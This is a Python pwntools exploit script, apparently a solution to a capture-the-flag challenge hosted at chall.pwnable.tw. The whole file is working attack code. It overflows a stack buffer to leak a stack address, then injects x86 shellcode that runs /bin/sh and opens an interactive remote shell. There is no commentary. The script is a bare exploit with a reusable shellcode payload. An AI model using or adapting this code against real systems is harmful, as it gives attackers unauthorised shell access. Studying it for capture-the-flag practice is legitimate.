#!/usr/bin/python
        
#ABDELJALIL NOUIRI
#author : abdel001nouiri@gmail.com
                    
from pwn import *
                            
                                
HOST = 'chall.pwnable.tw'
PORT = 10000
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
gad = 0x8048087 #mov %esp,%ecx
                                                                    
def Expl0i7i7(ip,port):
    con = remote(ip,port)
    con.recv()
    payload= "A"*20+p32(gad)
    con.send(payload)
    leak = u32(con.recv(4))
    print hex(leak)
                                                                                    
#    con.recv()
    payload = 'A'*20+p32(leak+0x18)+"DEAD"+'\x31\xd2'+shellcode
    con.send(payload)
    con.interactive("\nshell# ")
                                                                                                                           
Expl0i7i7(HOST,PORT)
